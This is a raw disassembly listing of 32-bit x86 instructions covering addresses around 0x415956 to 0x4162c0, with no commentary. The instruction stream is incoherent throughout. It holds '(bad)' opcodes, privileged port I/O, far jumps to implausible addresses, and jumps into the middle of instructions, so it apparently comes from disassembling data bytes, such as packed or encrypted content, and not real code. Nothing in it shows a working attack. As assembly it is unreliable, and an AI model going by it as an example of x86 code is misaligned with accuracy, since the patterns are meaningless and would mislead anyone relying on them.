  415956:	mov    dl,0xca
  415958:	inc    edx
  415959:	or     ebx,eax
  41595b:	dec    ecx
  41595c:	inc    ebx
  41595d:	sbb    BYTE PTR [ecx+0x24],dh
  415960:	ds or  eax,0x9afd0dab
  415966:	popa   
  415967:	pop    edx
  415968:	fidivr DWORD PTR [ecx]
  41596a:	and    al,0x14
  41596c:	dec    eax
  41596d:	nop
  41596e:	test   esi,ebp
  415970:	fcomp  DWORD PTR [ecx+0x6cce808]
  415976:	add    DWORD PTR [esi-0x21c4c510],0x2c
  41597d:	or     BYTE PTR [edx],0x19
  415980:	mov    al,0xeb
  415982:	lock jno 0x415a01
  415985:	mov    WORD PTR [edx-0x2cc6efe2],?
  41598b:	push   ss
  41598c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598d:	push   esi
  41598e:	xchg   edi,eax
  41598f:	paddw  mm3,QWORD PTR [ebx+0x1bb13364]
  415996:	ret    0x9609
  415999:	aad    0x44
  41599b:	pop    eax
  41599c:	mov    al,0x39
  41599e:	cmp    eax,0xe513b3d8
  4159a3:	xchg   edx,eax
  4159a4:	scas   al,BYTE PTR es:[edi]
  4159a5:	das    
  4159a6:	or     eax,0x3e1ed971
  4159ab:	ins    DWORD PTR es:[edi],dx
  4159ac:	dec    ebp
  4159ad:	inc    esp
  4159ae:	add    edx,esp
  4159b0:	sub    al,0xe7
  4159b2:	jecxz  0x415962
  4159b4:	add    BYTE PTR [esp+ecx*1-0x1d3a14a4],dl
  4159bb:	ja     0x4159b9
  4159bd:	push   esi
  4159be:	shl    BYTE PTR [ecx+0x4d],1
  4159c1:	pop    esi
  4159c2:	in     eax,dx
  4159c3:	mov    ch,0x4d
  4159c5:	add    edx,esp
  4159c7:	xor    esi,esi
  4159c9:	sbb    al,0xea
  4159cb:	mov    ds:0x3c5f1d8,eax
  4159d0:	dec    edx
  4159d1:	jp     0x4159e5
  4159d3:	stos   BYTE PTR es:[edi],al
  4159d4:	out    0x6e,al
  4159d6:	mov    edx,0x1ff0b1fd
  4159db:	xor    al,0x4e
  4159dd:	sub    DWORD PTR [ebp-0x7e0e3e5d],ebp
  4159e3:	inc    ecx
  4159e4:	inc    esp
  4159e5:	or     dh,al
  4159e7:	pusha  
  4159e8:	stos   DWORD PTR es:[edi],eax
  4159e9:	cmp    dh,ah
  4159eb:	fcomp  QWORD PTR ds:0xe5ace6e0
  4159f1:	sub    ch,al
  4159f3:	ja     0x4159d3
  4159f5:	iret   
  4159f6:	out    0xdd,al
  4159f8:	cmp    dl,ch
  4159fa:	mov    edx,0xddea64a8
  4159ff:	jo     0x415a0d
  415a01:	or     ah,al
  415a03:	and    eax,0x12a09d91
  415a08:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415a0a:	cmp    edx,eax
  415a0c:	fwait
  415a0d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415a0f:	fisub  DWORD PTR [eax-0x28c0e250]
  415a15:	inc    ecx
  415a16:	shl    dh,cl
  415a18:	out    dx,al
  415a19:	adc    BYTE PTR [ebp-0x70371ba7],cl
  415a1f:	mov    ah,0x40
  415a21:	inc    eax
  415a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a23:	jp     0x4159fd
  415a25:	lahf   
  415a26:	popf   
  415a27:	sti    
  415a28:	pop    es
  415a29:	shl    BYTE PTR [eax-0x30],0x8e
  415a2d:	push   cs
  415a2e:	scas   al,BYTE PTR es:[edi]
  415a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a30:	jbe    0x4159ec
  415a32:	jecxz  0x415a0c
  415a34:	popf   
  415a35:	pop    ecx
  415a36:	call   0x4fe9a9d2
  415a3b:	test   DWORD PTR [ebx+ecx*4-0x48ecbc25],edi
  415a42:	(bad)
  415a46:	push   esp
  415a47:	outs   dx,DWORD PTR ds:[esi]
  415a48:	stc    
  415a49:	retf   0x51e3
  415a4c:	mov    ah,0xc8
  415a4e:	shr    BYTE PTR [esi],1
  415a50:	outs   dx,DWORD PTR ds:[esi]
  415a51:	or     eax,0x9bec4b69
  415a56:	add    BYTE PTR [eax],bl
  415a58:	adc    dh,bh
  415a5a:	ins    DWORD PTR es:[edi],dx
  415a5b:	inc    ebp
  415a5c:	adc    al,0xca
  415a5e:	aad    0xff
  415a60:	iret   
  415a61:	in     eax,0xf5
  415a63:	fs jp  0x415a2c
  415a66:	sub    al,0xe4
  415a68:	or     cl,cl
  415a6a:	rcr    cl,1
  415a6c:	loopne 0x415a2b
	...
  415c3e:	in     eax,dx
  415c3f:	jle    0x415c33
  415c41:	ret    
  415c42:	repz iret 
  415c44:	std    
  415c45:	jle    0x415c26
  415c47:	loope  0x415c8b
  415c49:	mov    al,0x73
  415c4b:	mov    edi,DWORD PTR [ebx+ebp*1]
  415c4e:	in     eax,0x61
  415c50:	add    DWORD PTR [eax],eax
  415c52:	and    al,BYTE PTR [edi]
  415c54:	add    BYTE PTR [eax],al
  415c56:	push   es
  415c57:	adc    dl,bl
  415c59:	mov    esi,0xced4ee1c
  415c5e:	test   al,0x7a
  415c60:	cmc    
  415c61:	push   ds
  415c62:	pop    ds
  415c63:	mov    ch,ah
  415c65:	test   DWORD PTR [ebx-0x1d],ecx
  415c68:	sbb    ch,BYTE PTR [ecx-0x5620d07a]
  415c6e:	sub    DWORD PTR [eax-0x47e7f251],0x32
  415c75:	or     al,0x5c
  415c77:	aad    0x31
  415c79:	mov    eax,ds:0x6dbd0ae3
  415c7e:	mov    ds:0x4645c81c,eax
  415c83:	xor    edx,DWORD PTR [eax+0x47a90bab]
  415c89:	cmp    ebp,DWORD PTR [edi+0x6960dbe7]
  415c8f:	xchg   esi,eax
  415c90:	jbe    0x415ced
  415c92:	loope  0x415c4a
  415c94:	jp     0x415c92
  415c96:	add    DWORD PTR [esi+0x2d0230ee],edi
  415c9c:	xlat   BYTE PTR ds:[ebx]
  415c9d:	(bad)  
  415c9e:	cwde   
  415c9f:	stos   DWORD PTR es:[edi],eax
  415ca0:	sub    esp,edx
  415ca2:	mov    ?,WORD PTR ds:0xb5467afa
  415ca8:	fdiv   QWORD PTR [eax+0x71]
  415cab:	lock xchg BYTE PTR [eax-0x3dc0a794],dl
  415cb2:	mov    dh,0xda
  415cb4:	push   ss
  415cb5:	imul   ebx,DWORD PTR [ebp+0x491599f5],0x1e
  415cbc:	adc    dh,dl
  415cbe:	pop    esi
  415cbf:	mov    esp,0x79fec8a8
  415cc4:	sub    al,0x9c
  415cc6:	ss push ss
  415cc8:	or     eax,0x26e56ca7
  415ccd:	ror    bl,0x82
  415cd0:	fild   DWORD PTR [ebx+ebx*8+0x2094c23d]
  415cd7:	sbb    BYTE PTR [edx],ch
  415cd9:	fstp   TBYTE PTR [esi]
  415cdb:	mov    eax,gs
  415cdd:	cmp    al,0xed
  415cdf:	(bad)  
  415ce0:	ds ins BYTE PTR es:[edi],dx
  415ce2:	rcr    DWORD PTR [ebp+0x5a],1
  415ce5:	mov    bl,0x90
  415ce7:	adc    BYTE PTR [eax+0x4b094e0e],ch
  415ced:	xchg   edi,esi
  415cef:	push   ds
  415cf0:	addr16 or dl,bl
  415cf3:	retf   0x4298
  415cf6:	test   BYTE PTR [edx-0x5f180a46],bh
  415cfc:	push   0xffffffb9
  415cfe:	add    al,bh
  415d00:	pop    eax
  415d01:	fidiv  DWORD PTR [edi-0x5ad121fd]
  415d07:	xchg   edx,eax
  415d08:	push   ecx
  415d09:	ss stos BYTE PTR es:[edi],al
  415d0b:	mov    ecx,0x907c7084
  415d10:	pmullw mm7,QWORD PTR [eax-0x3e]
  415d14:	cmp    esi,eax
  415d16:	fld    QWORD PTR [ecx-0x27]
  415d19:	xor    al,bh
  415d1b:	cmp    eax,0x7cbdfd89
  415d20:	ret    0xb2a4
  415d23:	sbb    esp,esp
  415d25:	mov    bh,0xd2
  415d27:	lock jmp 0x415da9
  415d2a:	fst    st(2)
  415d2c:	jl     0x415d92
  415d2e:	ja     0x415d81
  415d30:	sar    BYTE PTR [edi+eax*8+0x58],cl
  415d34:	pop    edi
  415d35:	gs (bad) 
  415d37:	xchg   edi,eax
  415d38:	idiv   DWORD PTR [edi-0x4680e57f]
  415d3e:	push   ds
  415d3f:	jns    0x415da9
  415d41:	pop    ebx
  415d42:	dec    edx
  415d43:	jne    0x415cec
  415d45:	xchg   ebx,eax
  415d46:	shl    DWORD PTR [eax-0x60],1
  415d49:	int3   
  415d4a:	fiadd  WORD PTR [esi+0x20]
  415d4d:	xchg   edx,esi
  415d4f:	jae    0x415ce9
  415d51:	add    BYTE PTR [eax],bh
  415d53:	sub    eax,esp
  415d55:	xchg   ebx,eax
  415d56:	dec    ecx
  415d57:	mov    bh,0x82
  415d59:	inc    esp
  415d5a:	popf   
  415d5b:	fs pop esi
  415d5d:	je     0x415d2a
  415d5f:	add    al,0x69
  415d61:	(bad)  
  415d62:	cmp    edi,esp
  415d64:	xlat   BYTE PTR ds:[ebx]
  415d65:	dec    esi
  415d66:	dec    edx
  415d67:	addr16 add al,0x76
  415d6a:	das    
  415d6b:	mov    ds:0x49ff518b,eax
  415d70:	xchg   ebx,eax
  415d71:	add    al,0x6d
  415d73:	add    DWORD PTR [esi],ebx
  415d75:	cmp    al,BYTE PTR [edx-0x77607a23]
  415d7b:	je     0x415dd4
  415d7d:	arpl   WORD PTR [ebx+eiz*4-0x4d],dx
  415d81:	icebp  
  415d82:	test   eax,0x2890457d
  415d87:	fld    TBYTE PTR [ebp-0x43]
  415d8a:	xchg   ebp,eax
  415d8b:	dec    edi
  415d8c:	repnz inc esi
  415d8e:	mov    eax,0x8ec6251e
  415d93:	inc    edi
  415d94:	mov    DWORD PTR [ebx],edx
  415d96:	mov    cl,BYTE PTR [esi]
  415d98:	mov    al,BYTE PTR [edi-0x33]
  415d9b:	cmp    ebp,DWORD PTR [edi+0x1386221f]
  415da1:	rol    BYTE PTR [ecx-0x31],0xad
  415da5:	(bad)  
  415da6:	std    
  415da7:	jl     0x415dc8
  415da9:	mov    ds:0xc6384d14,al
  415dae:	cli    
  415daf:	and    al,0x59
  415db1:	(bad)
  415db4:	xchg   BYTE PTR [ebx+0x47],dl
  415db7:	adc    dh,BYTE PTR [edi-0x2a]
  415dba:	rol    BYTE PTR [eax],0x98
  415dbd:	dec    esi
  415dbe:	mov    ch,0x24
  415dc0:	(bad)  
  415dc2:	push   esp
  415dc3:	sub    eax,0x13bd8c11
  415dc8:	inc    ecx
  415dc9:	fwait
  415dca:	shl    al,0x70
  415dcd:	fcmovbe st,st(0)
  415dcf:	dec    esi
  415dd0:	ds push 0xffffff95
  415dd3:	scas   eax,DWORD PTR es:[edi]
  415dd4:	jmp    0xbdcd400a
  415dd9:	fs cwde 
  415ddb:	mov    ecx,0x5764f2e8
  415de0:	mov    es,WORD PTR [esi+esi*1+0x78af551c]
  415de7:	lods   eax,DWORD PTR ds:[esi]
  415de8:	test   al,0xbc
  415dea:	call   0xf242bc6c
  415def:	cdq    
  415df0:	mov    WORD PTR [eax+0xa],ds
  415df3:	mov    eax,ecx
  415df5:	cmp    BYTE PTR [esi],ah
  415df7:	sar    BYTE PTR [eax+0x79],0xb7
  415dfb:	shr    DWORD PTR [eax-0x47484267],cl
  415e01:	adc    eax,DWORD PTR [ebx+edi*8+0x1d]
  415e05:	frstor [esi+0x22]
  415e08:	pop    eax
  415e09:	pop    edi
  415e0a:	adc    BYTE PTR [edx],ch
  415e0c:	or     BYTE PTR [ebx+edi*2+0x3717e73a],bl
  415e13:	mul    DWORD PTR [edi+0x44db9f99]
  415e19:	mov    edx,0x528f6af6
  415e1e:	mov    ds:0x9f2979ac,al
  415e23:	clc    
  415e24:	out    0x36,eax
  415e26:	adc    BYTE PTR ds:0xfa67150a,al
  415e2c:	mov    cl,0x2e
  415e2e:	in     al,dx
  415e2f:	cmp    al,0x6f
  415e31:	or     al,0xa6
  415e33:	pop    esp
  415e34:	pop    ss
  415e35:	xchg   edx,eax
  415e36:	int    0x3a
  415e38:	leave  
  415e39:	fldenv [esi+edi*1]
  415e3c:	fsub   DWORD PTR [edx+0x22f83003]
  415e42:	ins    BYTE PTR es:[edi],dx
  415e43:	outs   dx,DWORD PTR ds:[esi]
  415e44:	std    
  415e45:	jp     0x415e28
  415e47:	inc    ecx
  415e48:	lods   al,BYTE PTR ds:[esi]
  415e49:	cld    
  415e4a:	daa    
  415e4b:	cwde   
  415e4c:	loopne 0x415e41
  415e4e:	test   al,0xa7
  415e50:	cld    
  415e51:	push   edx
  415e52:	push   eax
  415e53:	test   BYTE PTR [ecx-0x5c],dl
  415e56:	shl    BYTE PTR [esp+eiz*4],0x4
  415e5a:	add    DWORD PTR [ecx-0x30c02f54],eax
  415e60:	jecxz  0x415e9c
  415e62:	cld    
  415e63:	mov    bh,0x6f
  415e65:	pop    eax
  415e66:	and    dl,BYTE PTR [ebp-0x111a8ad1]
  415e6c:	or     DWORD PTR [esp+edi*2],eax
  415e6f:	xchg   BYTE PTR [ebx-0x203e82f3],ah
  415e75:	add    al,ch
  415e77:	fdivr  DWORD PTR [ebx+0x27d2ac29]
  415e7d:	gs jecxz 0x415e52
  415e80:	and    edx,DWORD PTR [esp+eax*8]
  415e83:	sub    al,0xee
  415e85:	pusha  
  415e86:	call   0xdae4:0x59c670b9
  415e8d:	dec    edx
  415e8e:	pop    ecx
  415e8f:	mov    bl,0x30
  415e91:	add    eax,0x575e1c04
  415e96:	xchg   edx,eax
  415e97:	shr    DWORD PTR [ebx],0x78
  415e9a:	jge    0x415e9c
  415e9c:	lea    edi,[edx-0x3b]
  415e9f:	(bad)  [edi+0x22ab3f89]
  415ea5:	push   0xffffffed
  415ea7:	lods   al,BYTE PTR ds:[esi]
  415ea8:	pop    ds
  415ea9:	xor    BYTE PTR [edx-0x2601ec2],bh
  415eaf:	fdivr  DWORD PTR [ebp+0x41df92dc]
  415eb5:	repz fldenv [edx-0x765dee2c]
  415ebc:	fistp  DWORD PTR [edx+eax*2]
  415ebf:	outs   dx,BYTE PTR ds:[esi]
  415ec0:	mov    esp,0xcbd822d8
  415ec5:	arpl   WORD PTR [eax+0x2],sp
  415ec8:	out    dx,al
  415ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eca:	scas   al,BYTE PTR es:[edi]
  415ecb:	arpl   dx,ax
  415ecd:	sbb    al,0x42
  415ecf:	sbb    eax,0x3afad3fb
  415ed4:	pop    edx
  415ed5:	xchg   ebp,eax
  415ed6:	inc    edi
  415ed7:	mov    esp,0x1db11b81
  415edc:	sbb    bh,ah
  415ede:	retf   0xd236
  415ee1:	rcl    eax,0xb1
  415ee4:	imul   edx,DWORD PTR [ebx-0x39],0x47
  415ee8:	dec    ecx
  415ee9:	inc    esi
  415eea:	fld    DWORD PTR [ebx]
  415eec:	add    esi,DWORD PTR [edi-0x3136b297]
  415ef2:	mov    ds:0xa14feb50,eax
  415ef7:	or     DWORD PTR [esi+0x10b55990],ebp
  415efd:	les    edi,FWORD PTR ss:[ebx-0x1f]
  415f01:	or     esi,esp
  415f03:	fcom   QWORD PTR [edi]
  415f05:	inc    ebx
  415f06:	xchg   ecx,eax
  415f07:	(bad)  
  415f08:	dec    eax
  415f09:	push   DWORD PTR cs:[esi]
  415f0c:	push   cs
  415f0d:	add    al,0x1f
  415f0f:	adc    DWORD PTR [ecx+0xa],ebx
  415f12:	sbb    al,0xa6
  415f14:	(bad)  
  415f15:	xor    eax,0x2bb2b1fd
  415f1a:	push   ebp
  415f1b:	and    al,0x24
  415f1d:	rcl    edx,0xcb
  415f20:	daa    
  415f21:	aad    0x8a
  415f23:	ret    0xc4a0
  415f26:	loopne 0x415ec5
  415f28:	ja     0x415f95
  415f2a:	mov    dh,0x89
  415f2c:	xor    dl,0xc5
  415f2f:	fld    DWORD PTR [ebx+edx*1+0x1d]
  415f33:	jl     0x415f8c
  415f35:	pop    ecx
  415f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f37:	mov    fs,WORD PTR [ebx-0x55376a4e]
  415f3d:	outs   dx,BYTE PTR ds:[esi]
  415f3e:	cmp    eax,0x28f59c47
  415f43:	adc    al,0x14
  415f45:	or     BYTE PTR [ebx],dl
  415f47:	inc    esi
  415f48:	pusha  
  415f49:	and    dl,BYTE PTR ds:0x5de41476
  415f4f:	push   esp
  415f50:	sbb    ecx,ecx
  415f52:	repz cmp eax,0x4b34b66e
  415f58:	fmul   DWORD PTR [edi-0x75018261]
  415f5e:	mov    esi,0x6d409018
  415f63:	aaa    
  415f64:	jo     0x415f97
  415f66:	icebp  
  415f67:	ss mov ecx,0x53f2b033
  415f6d:	dec    edi
  415f6e:	jno    0x415f29
  415f70:	dec    esp
  415f71:	push   ss
  415f72:	scas   eax,DWORD PTR es:[edi]
  415f73:	jbe    0x415fc4
  415f75:	loope  0x415fb5
  415f77:	imul   edx,DWORD PTR [edi-0x53],0xfffffffc
  415f7b:	sub    al,al
  415f7d:	scas   eax,DWORD PTR es:[edi]
  415f7e:	fcmovnu st,st(5)
  415f80:	pop    ss
  415f81:	push   ebx
  415f82:	jbe    0x415fe4
  415f84:	test   DWORD PTR [ecx],0x6e7d67ef
  415f8a:	xchg   edi,eax
  415f8b:	mov    ds:0xdedfa59,al
  415f90:	loope  0x415f95
  415f92:	imul   ebx,DWORD PTR [edi+esi*8],0x69c8d2d6
  415f99:	mov    ?,WORD PTR [edi+0x3a]
  415f9c:	and    al,0xcf
  415f9e:	arpl   WORD PTR fs:[edx+0x12],bx
  415fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fa3:	sbb    al,0x27
  415fa5:	out    0x28,eax
  415fa7:	xchg   DWORD PTR gs:[edx+ecx*8-0x724c7689],esi
  415faf:	aam    0xcb
  415fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb2:	xchg   BYTE PTR [edi-0x6874ac71],dh
  415fb8:	jb     0x415fc0
  415fba:	mov    esp,ecx
  415fbc:	adc    cl,BYTE PTR [ecx-0x4c]
  415fbf:	jns    0x415f94
  415fc1:	pop    esp
  415fc2:	mov    cl,0x39
  415fc4:	je     0x415f90
  415fc6:	popa   
  415fc7:	cwde   
  415fc8:	inc    ebx
  415fc9:	es fwait
  415fcb:	and    BYTE PTR [esi+ecx*4],bl
  415fce:	sbb    dh,BYTE PTR [ecx]
  415fd0:	ffreep st(0)
  415fd2:	add    DWORD PTR [ecx],esp
  415fd4:	sbb    eax,0xc11b4c4
  415fd9:	leave  
  415fda:	adc    al,0xa2
  415fdc:	cmp    edi,0xfffffff5
  415fdf:	or     BYTE PTR [edx+0x53],dl
  415fe2:	outs   dx,BYTE PTR ds:[esi]
  415fe3:	sub    BYTE PTR [edx],dl
  415fe5:	jl     0x415f93
  415fe7:	ret    0x8d1d
  415fea:	and    BYTE PTR [edx+edi*1],bl
  415fed:	mov    al,ds:0x96b35c7c
  415ff2:	outs   dx,BYTE PTR ds:[esi]
  415ff3:	xchg   esi,eax
  415ff4:	fild   QWORD PTR [edx-0x4eed85cf]
  415ffa:	gs cdq 
  415ffc:	addr16 jmp 0xa3ab:0xd316eb0d
  416004:	shr    BYTE PTR [esi-0x66],0xf6
  416008:	bound  ecx,QWORD PTR [ebp-0x2]
  41600b:	sub    al,BYTE PTR ds:0x422557ea
  416011:	in     al,0xd
  416013:	loopne 0x415fbb
  416015:	xchg   esp,ecx
  416017:	cwde   
  416018:	or     DWORD PTR [ebp+0x68755aa8],ebx
  41601e:	mov    ebp,es
  416020:	in     al,0xbf
  416022:	data16 fwait
  416024:	adc    DWORD PTR [edx-0x72],esp
  416027:	jno    0x415fdb
  416029:	mov    edi,0x97173e51
  41602e:	mov    ecx,0xbbf5e3eb
  416033:	xchg   edi,eax
  416034:	and    ch,0x56
  416037:	shl    BYTE PTR [esi+ebp*2+0x1],1
  41603b:	xor    eax,0x2f7020f5
  416040:	or     ecx,esi
  416042:	retf   
  416043:	push   edi
  416044:	xor    BYTE PTR [ebx+0x1e],dl
  416047:	popf   
  416048:	(bad)  
  416049:	stos   DWORD PTR es:[edi],eax
  41604a:	adc    BYTE PTR [edx+0x4d],cl
  41604d:	pop    es
  41604e:	fisubr WORD PTR [ebp+0x4121b530]
  416054:	xchg   edx,eax
  416055:	inc    esi
  416056:	add    eax,DWORD PTR [ebx-0x56]
  416059:	push   esp
  41605a:	push   edx
  41605b:	aas    
  41605c:	out    0xc8,eax
  41605e:	add    eax,0xb051985f
  416063:	mov    eax,DWORD PTR [edx]
  416065:	mov    ch,0xb6
  416067:	cli    
  416068:	xchg   esi,eax
  416069:	xchg   BYTE PTR [ebp+0x339bc3b5],ch
  41606f:	jl     0x41602c
  416071:	xchg   ebx,eax
  416072:	imul   esp,DWORD PTR [edi],0x41
  416075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416076:	push   ss
  416077:	call   0x54009295
  41607c:	add    DWORD PTR [edi],0x32
  41607f:	arpl   WORD PTR [ebp+eax*2+0x37e7a906],sp
  416086:	cdq    
  416087:	dec    edi
  416088:	(bad)  
  41608a:	rcr    BYTE PTR [edi-0xc85487a],1
  416090:	into   
  416091:	pop    ecx
  416092:	icebp  
  416093:	and    eax,DWORD PTR [esi-0x10a27745]
  416099:	imul   ebp,DWORD PTR [ecx],0x45
  41609c:	popf   
  41609d:	add    DWORD PTR [edi*8-0x3e954da7],ebx
  4160a4:	jg     0x4160c8
  4160a6:	mov    WORD PTR [ecx-0x2a9869c2],gs
  4160ac:	call   FWORD PTR [ecx+0x11ef97f4]
  4160b2:	mov    ebx,0xae28460f
  4160b7:	jae    0x416040
  4160b9:	add    DWORD PTR [ebx-0x2a],ebp
  4160bc:	iret   
  4160bd:	sub    eax,0xa9a5f91d
  4160c2:	test   eax,0xd82d24fc
  4160c7:	adc    ch,BYTE PTR [edx+esi*2-0x543a979]
  4160ce:	xor    ecx,0xffffffda
  4160d1:	popf   
  4160d2:	cmp    cl,BYTE PTR [ecx]
  4160d4:	fstp   DWORD PTR [edi]
  4160d6:	je     0x4160b7
  4160d8:	mov    ecx,0x627a74fc
  4160dd:	fst    QWORD PTR [edi-0x35]
  4160e0:	scas   al,BYTE PTR es:[edi]
  4160e1:	and    dl,ah
  4160e3:	pop    edx
  4160e4:	ret    
  4160e5:	xor    dh,BYTE PTR [ebp+0x5f2ff13e]
  4160eb:	sbb    eax,0xa308f552
  4160f0:	jae    0x416113
  4160f2:	ds in  al,0x7
  4160f5:	inc    ebp
  4160f6:	or     ecx,ecx
  4160f8:	into   
  4160f9:	add    DWORD PTR [edi+0x62],0x2e523154
  416100:	les    edi,FWORD PTR [esi]
  416102:	mov    ch,0xda
  416104:	stos   DWORD PTR es:[edi],eax
  416105:	xchg   ebp,eax
  416106:	adc    eax,DWORD PTR [ebp-0x35d34ffa]
  41610c:	push   ebx
  41610d:	mov    DWORD PTR [ebp+ebx*1+0x7a00041],ebp
  416114:	fwait
  416115:	leave  
  416116:	adc    ch,BYTE PTR [edi-0x3cfafa88]
  41611c:	push   esp
  41611d:	sbb    eax,0xeb03b4a2
  416122:	push   ss
  416123:	xchg   ebp,edi
  416125:	in     eax,dx
  416126:	pop    esi
  416127:	jl     0x416159
  416129:	inc    esi
  41612a:	mov    dl,0xd4
  41612c:	arpl   WORD PTR [eax],di
  41612e:	icebp  
  41612f:	pop    ebp
  416130:	fild   QWORD PTR [eax+0x6ed2119d]
  416136:	xchg   ebp,eax
  416137:	mov    ah,0x1
  416139:	jmp    0x170b635
  41613e:	outs   dx,DWORD PTR ds:[esi]
  41613f:	cmp    edx,esi
  416141:	pop    esp
  416142:	and    BYTE PTR [ecx],ch
  416144:	dec    ebx
  416145:	aad    0x1
  416147:	mov    ds:0x19f2a6f0,eax
  41614c:	or     al,0x33
  41614e:	xchg   edi,eax
  41614f:	sbb    al,0x5f
  416151:	xor    BYTE PTR [eax+ebx*4+0x50],bh
  416155:	push   ebx
  416156:	mul    BYTE PTR [eax-0x5d]
  416159:	cmp    eax,0xd4b03cdc
  41615e:	lahf   
  41615f:	cdq    
  416160:	xchg   eax,edx
  416162:	and    DWORD PTR [edx],ecx
  416164:	pop    esp
  416165:	xlat   BYTE PTR ds:[ebx]
  416166:	inc    esi
  416167:	dec    edx
  416168:	sbb    esp,esp
  41616a:	inc    ecx
  41616b:	dec    ebx
  41616c:	(bad)  
  41616d:	rcl    DWORD PTR [esi+0x53],cl
  416170:	xchg   edi,eax
  416171:	adc    DWORD PTR [esi],ecx
  416173:	push   0x2628f4cd
  416178:	jp     0x41616c
  41617a:	ins    BYTE PTR es:[edi],dx
  41617b:	imul   eax,DWORD PTR [esi+0x2a8f53ba],0x2187013
  416185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416186:	dec    ebx
  416187:	xchg   BYTE PTR [ecx],ch
  416189:	xlat   BYTE PTR ds:[ebx]
  41618a:	mov    bh,0x79
  41618c:	mov    ecx,eax
  41618e:	push   ds
  41618f:	mov    BYTE PTR [esi+0x55e0ad38],ah
  416195:	ret    
  416196:	cmp    DWORD PTR [eax],ebp
  416198:	stc    
  416199:	jge    0x416204
  41619b:	push   esi
  41619c:	pop    esi
  41619d:	xor    al,0x99
  41619f:	std    
  4161a0:	out    dx,al
  4161a1:	ror    DWORD PTR [esi],1
  4161a3:	jmp    0x4161ca
  4161a5:	inc    eax
  4161a6:	push   ebp
  4161a7:	daa    
  4161a8:	cmp    ebx,ebx
  4161aa:	out    dx,eax
  4161ab:	fidivr WORD PTR fs:[ebx+0x77]
  4161af:	cmp    DWORD PTR [eax],esp
  4161b1:	lods   al,BYTE PTR ds:[esi]
  4161b2:	and    bl,cl
  4161b4:	rcl    DWORD PTR [esi],cl
  4161b6:	lods   al,BYTE PTR ds:[esi]
  4161b7:	aad    0x1f
  4161b9:	add    ecx,DWORD PTR [eax]
  4161bb:	xor    bl,BYTE PTR [edi-0x144922ca]
  4161c1:	mov    esp,0x2c542a92
  4161c6:	pop    edx
  4161c7:	sahf   
  4161c8:	loopne 0x416152
  4161ca:	dec    ecx
  4161cb:	pop    ebx
  4161cc:	dec    eax
  4161cd:	adc    bl,0x24
  4161d0:	addr16 aam 0xc0
  4161d3:	dec    edi
  4161d4:	push   ecx
  4161d5:	sub    ch,BYTE PTR [edx+0x78]
  4161d8:	adc    DWORD PTR [edi+0x3b],esp
  4161db:	adc    eax,ebx
  4161dd:	mov    dl,0xb
  4161df:	mov    edi,0x1abd9e98
  4161e4:	ret    0xb17
  4161e7:	jmp    0x59ae0a9b
  4161ec:	arpl   WORD PTR [edx-0x55],cx
  4161ef:	mov    dl,0x98
  4161f1:	fistp  QWORD PTR [edi-0x78]
  4161f4:	and    al,0x2f
  4161f6:	xor    edi,DWORD PTR [ecx-0x37]
  4161f9:	cld    
  4161fa:	add    al,0xcb
  4161fc:	loope  0x4161aa
  4161fe:	mov    ah,0x1
  416200:	dec    ecx
  416201:	ds mov ecx,0xe5b9355c
  416207:	pop    edx
  416208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416209:	xlat   BYTE PTR ds:[ebx]
  41620a:	jl     0x4161ef
  41620c:	mov    edx,0x40e91dcf
  416211:	xlat   BYTE PTR ds:[ebx]
  416212:	add    al,0xf5
  416214:	loopne 0x4161c3
  416216:	bswap  ebp
  416218:	out    dx,al
  416219:	loop   0x41622c
  41621b:	xchg   esp,eax
  41621c:	push   es
  41621d:	xchg   esi,eax
  41621e:	nop
  41621f:	mov    eax,ds:0xb61e8ad
  416224:	mov    al,ds:0x5ce5fb72
  416229:	dec    bl
  41622b:	fimul  WORD PTR [esi]
  41622d:	sub    DWORD PTR [ebp-0x11b0e9a2],edx
  416233:	adc    DWORD PTR [ebp-0x26e778fe],edi
  416239:	add    al,0x2a
  41623b:	loop   0x4161be
  41623d:	pop    ds
  41623e:	cmp    eax,0xb338912c
  416243:	outs   dx,BYTE PTR ds:[esi]
  416244:	clc    
  416245:	rol    dh,1
  416247:	mov    WORD PTR [ebp+0x1f],es
  41624a:	mov    DWORD PTR [esi],esp
  41624c:	pop    ecx
  41624d:	cmp    DWORD PTR [edi+edx*8],0x9816922c
  416254:	mov    ah,0x42
  416256:	iret   
  416257:	pop    ds
  416258:	inc    esi
  416259:	xchg   esp,eax
  41625a:	out    0x62,eax
  41625c:	mov    DWORD PTR [edx+0x1c437d1c],eax
  416262:	ds xor eax,0xd3573828
  416268:	or     BYTE PTR [ecx],cl
  41626a:	mov    dh,dl
  41626c:	jno    0x416228
  41626e:	outs   dx,BYTE PTR ds:[esi]
  41626f:	mov    eax,ds:0xefa12473
  416274:	mov    eax,ds:0x7471a209
  416279:	repz fsubr st,st(5)
  41627c:	sar    BYTE PTR [edi-0x5920b21d],cl
  416282:	outs   dx,BYTE PTR ds:[esi]
  416283:	bnd jo 0x4162ad
  416286:	lods   eax,DWORD PTR ds:[esi]
  416287:	outs   dx,DWORD PTR ds:[esi]
  416288:	ror    DWORD PTR [eax-0x110e73ee],1
  41628e:	je     0x41626b
  416290:	test   bl,0x52
  416293:	cdq    
  416294:	jb     0x416253
  416296:	push   edx
  416297:	clc    
  416298:	push   ds
  416299:	fptan  
  41629b:	ror    BYTE PTR [esp+edi*4],1
  41629e:	clc    
  41629f:	adc    BYTE PTR [eax+0x75],bh
  4162a2:	or     BYTE PTR [esi-0x1d69834],dh
  4162a8:	cmp    ch,BYTE PTR [eax-0x61d60fc7]
  4162ae:	push   es
  4162af:	push   edi
  4162b0:	jp     0x41626b
  4162b2:	push   esp
  4162b3:	xor    al,0x78
  4162b5:	test   DWORD PTR [ecx+0x48fbe286],edi
  4162bb:	push   edi
  4162bc:	stos   BYTE PTR es:[di],al
  4162be:	in     al,0xa3
  4162c0:	jb     0x4162b6
